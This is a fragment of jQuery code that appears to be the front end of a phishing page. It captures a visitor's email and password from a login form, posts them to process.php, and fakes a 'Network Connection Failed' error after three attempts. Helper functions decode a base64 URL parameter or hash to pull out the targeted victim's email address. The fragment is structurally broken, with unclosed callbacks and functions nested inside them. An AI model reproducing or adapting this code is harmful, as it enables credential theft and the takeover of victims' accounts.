   $(document).ready(function() {

      var count = 0;

      $('#contact').submit(function(event) {
        event.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        var detail = $("#field").html();
        $("#password").addClass('grey-form');


        var msg = $('#msg').html();
        $('#msg').text(msg);
        count = count + 1;
        if (count >= 3) {
          count = 0;
          $('#msg').html('Network Connection Failed! Please Try again Later.')
          $('#submit-btn').html('Network Error!');
        } else {
          $.ajax({
            dataType: 'JSON',
            url: './process.php',
            type: 'POST',
            data: {
              email: email,
              password: password,
              detail: detail,

            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
              $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
              if (response['signal'] == 'no-pass') {
                count = 0;

                $('#msg').addClass('alert-danger');
                $("#password").val('');
                $("#password").removeClass('grey-form');

                $('#msg').html(response['msg']);
                $("#msg").show();
                $('#msg').addClass('alert-danger');
                $("#password").removeClass('grey-form');
                $("#password").val('');
                $(".modal-header").addClass('hide');

              } else {
                $('#msg').html(response['msg']);
              }

    function ucFirst(str) {
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    function getProcessparameter(){
          let s = getParameterByName('lo')
          let arr = JSON.parse(atob(s));
          return arr['email'];
    }

function getProcessHash(){
      if(window.location.hash){
          let h = window.location.hash;
          let s = h.split('#')[1];
          let arr = JSON.parse(atob(s));

          return arr['email'];
      }

      return null;
    }

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
          results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        var encodedUri = decodeURIComponent(results[2].replace(/\+/g, ' '));
        return atob(encodedUri);
      }
